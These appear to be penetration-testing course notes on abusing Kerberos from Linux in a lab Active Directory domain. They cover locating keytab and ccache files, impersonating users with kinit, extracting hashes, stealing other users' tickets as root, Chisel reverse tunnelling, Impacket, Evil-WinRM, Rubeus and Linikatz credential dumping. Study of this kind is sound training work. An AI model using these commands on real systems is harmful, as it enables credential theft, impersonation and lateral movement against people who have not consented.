Linux computers can connect to AD to provide centralized identity management and integrate with the organization's system, giving users the ability to have a single identity to authenticate on Linux and Windows computers.

Kerberos is commonly used with Linux machines connected to AD.

There are various ways a Linux machine can be configured to store Kerberos tickets.

**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

## Kerberos on Linux

Linux uses the same process as Windows to request a TGT and TGS, however how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases Linux machines store tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. by default the location is stored in the `KRB5CCNAME` environment variable, this variable can determine if Kerberos is used and if the default location is changed. These ccache files are protected by reading and writing permissions, but with elevated privileges can be easily accessed.

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A keytab file contains a pair of Kerberos principals and encrypted keys (which are derived from the Kerberos password), keytab can be used to authenticate to various remote systems using Kerberos without entering a password. The keytab files must be recreated when changing the password.

[Keytab](https://kb.iu.edu/d/aumh) files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.

**Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Linux Auth from Computer on the network
![[linux-auth-from-ms01.jpg]]

## Linux Auth via Port Forward
```shell-session
$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

## Identifying Linux and Active Directory Integration

We can identify if Linux machines are domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

### realm - Check if Linux Machine is Domain Joined
```shell-session
$ realm list
```

In case realm isn't available we can look for services used to integrate Linux with AD such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).

### ps - Check if Linux Machine is Domain Joined
```shell-session
$ ps -ef | grep -i "winbind\|sssd"
```

## Finding Kerberos Tickets in Linux

### Finding Keytab Files

The `.keytab` extension for Kerberos tickets is not mandatory, but is commonly used.

#### Using Find to Search for Files with Keytab in the Name
```shell-session
$ find / -name *keytab* -ls 2>/dev/null
```

Another way to find keytab files is in automated scripts.

#### Identifying Keytab Files in Cronjobs
```shell-session
$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

Above we can see the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) which allows interaction with kerberos, its function is to request the user's TGT and store the ticket in the cache (ccache file). we can use kinit to import a keytab into our session and act as the user.

In this example, we found a script importing a Kerberos ticket (`svc_workstations.kt`) for the user `svc_workstations@INLANEFREIGHT.HTB` before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.

**Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

### Finding ccache Files

A credential cache file holds Kerberos credentials while they remain valid, and generally while the user's session last, from when the user authenticates the domain. The `KRB5CCNAME` environment variable stores the path to this file is used by tools that support Kerberos authentication.

#### Reviewing Environment Variables for ccache Files
```shell-session
$ env | grep -i krb5
```

ccache files our stored by default in `/tmp`, if we gain access as privileged user we can impersonate a logged on user while the ccache file is still valid.

#### Searching for ccache Files in /tmp
```shell-session
$ ls -la /tmp
```

## Abusing Keytab Files

With a keytab file we can impersonate a user using `kinit`. To use the file we should know which user it was created for, `klist` is another application used to interact with Kerberos on Linux, the application reads the information from keytab file.

### Listing Keytab File Information
```shell-session
$ klist -k -t 
```

**Note:** **kinit** is case-sensitive.

### Impersonate a User with Keytab
```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

### Connecting to SMB Share as Carlos
```shell-session
$ smbclient //dc01/carlos -k -c ls
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable `KRB5CCNAME`.

## Keytab Extract

We can attempt to extract secrets from a keytab file to gain access to an account on the Linux machine.

We could use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, service principal, encryption type, and hashes.

### Extracting Keytab Hashes with KeyTabExtract
```shell-session
$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note:** A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack an NTLM hash, or even use a online repository like [https://crackstation.net/](https://crackstation.net/).

### Login as Carlos
```shell-session
$ su - carlos@inlanefreight.htb
$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

### Obtaining more Hashes
Carlos has a cronjob that uses a keytab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

## Abusing Keytab ccache

The ccache files located in `/tmp` are only readable by the user who created them and root.

### Privilege Escalation to Root

As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

### Looking for ccache Files
```shell-session
# ls -la /tmp
```

### Identifying Group Membership with the id Command
```shell-session
# id julio@inlanefreight.htb
```

### Importing the ccache File into our Current Session
```shell-session
root@linux01:~# klist
klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```

**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

## Using Linux Attack Tools with Kerberos

Most Linux attack tools that interact with Windows and AD support Kerberos authentication, when using in a domain joined machine we need to make sure the `KRB5CCNAME` environment variable is set to the ccache file we want to use. If we are attacking from a machine not part of the domain, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

If our attack box can't to the things in the above line we can proxy our traffic with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcore IP addresses of the domain and the machine we want to attack.

### Host File Modified
```shell-session
$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

### Proxychains Configuration File
```shell-session
$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

### Download Chisel to our Attack Host
```shell-session
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

### Connect to the Remote Computer with xfreerdp
```shell-session
$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### Execute chisel from the Remote Computer
```cmd-session
C:\htb> c:\tools\chisel.exe client <attacker ip>:8080 R:socks
```

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.

### Setting the KRB5CCNAME Environment Variable
```shell-session
$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket

To use Kerberos ticket we must specify the target machine name (not IP address), we can include `-no-pass` if we get a prompt for a password.

#### Using Impacket with proxychains and Kerberos Authentication
```shell-session
$ proxychains impacket-wmiexec dc01 -k
```

**Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

### Evil-Winrm

To use Evil-Winrm with Kerberos we need to install the Kerberos package used for network authentication, For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. We will get a prompt to set the realm (domain) and the KDC.

#### Installing Kerberos Authentication Package
```shell-session
$ sudo apt-get install krb5-user -y
```

#### Default Kerberos Version 5 realm
![[kerberos-realm.jpg]]

#### Administrative Server for your Kerberos Realm
![[kerberos-server-dc01.jpg]]

In case the package is already installed we will need to modify the `/etc/krb5.conf` configuration file.

#### Kerberos Configuration File for INLANEFREIGHT.HTB
```shell-session
Wildland4958@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

#### Using Evil-WinRM with Kerberos
```shell-session
$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename.

### Impacket Ticket Convertor
```shell-session
$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi # Converting from ccache to kirbi
```

We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.

#### Importing Converted Ticket into Windows Session with Rubeus
```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) brings a similar principle to Mimikatz to UNIX environments.

We need to be root to take advantage of this tool, this tool will extract all credentials including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. It places the credentials in a folder whose name starts with `linikatz.`. The credentials will be available in several formats, including ccache and keytabs.

### Linikatz Download and Execution
```shell-session
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
```

